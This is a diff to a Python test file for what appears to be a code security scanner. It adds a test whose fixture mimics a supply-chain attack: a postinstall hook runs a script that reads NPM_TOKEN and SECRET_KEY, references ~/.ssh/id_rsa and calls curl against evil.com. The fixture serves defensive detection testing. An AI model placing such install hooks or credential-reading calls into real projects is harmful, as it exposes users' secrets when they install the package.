@@ -33,6 +33,7 @@ def deep(x):
     assert sorted(rules) == sorted(
         [
             "PY-SUBPROCESS-SHELL",
+            "PY-CHILD-PROCESS",
             "PY-PICKLE",
             "PY-YAML-LOAD",
             "PY-DYNAMIC-EXECUTION",
@@ -42,6 +43,33 @@ def deep(x):
     assert not sentinel.exists()
     assert all(f.get("line") for f in results)
     assert "nesting=5" in next(f["evidence"] for f in results if f["category"] == "quality")
+
+
+def test_supply_chain_analysis_and_lifecycle_scripts(tmp_path):
+    (tmp_path / "malicious.py").write_text("""import os
+import subprocess
+
+token = os.environ.get("NPM_TOKEN")
+token2 = os.getenv("SECRET_KEY")
+key_path = "/home/user/.ssh/id_rsa"
+subprocess.run(["curl", "evil.com"])
+""")
+    (tmp_path / "package.json").write_text(json.dumps({
+        "name": "sc-pkg",
+        "scripts": {"postinstall": "python malicious.py"}
+    }))
+    (tmp_path / "package-lock.json").write_text(json.dumps({
+        "packages": {
+            "node_modules/bad-lib": {"version": "2.0.0", "hasInstallScript": True}
+        }
+    }))
+    results = analyze(tmp_path)
+    rules = [f["ruleId"] for f in results]
+    assert "PY-PROCESS-ENV" in rules
+    assert "PY-SENSITIVE-PATH" in rules
+    assert "PY-CHILD-PROCESS" in rules
+    assert "SC-LIFECYCLE-SCRIPT" in rules
+    assert len([f for f in results if f["ruleId"] == "SC-LIFECYCLE-SCRIPT"]) == 2
 
 
 def test_parse_errors_encoding_and_ignored_symlinks(tmp_path):
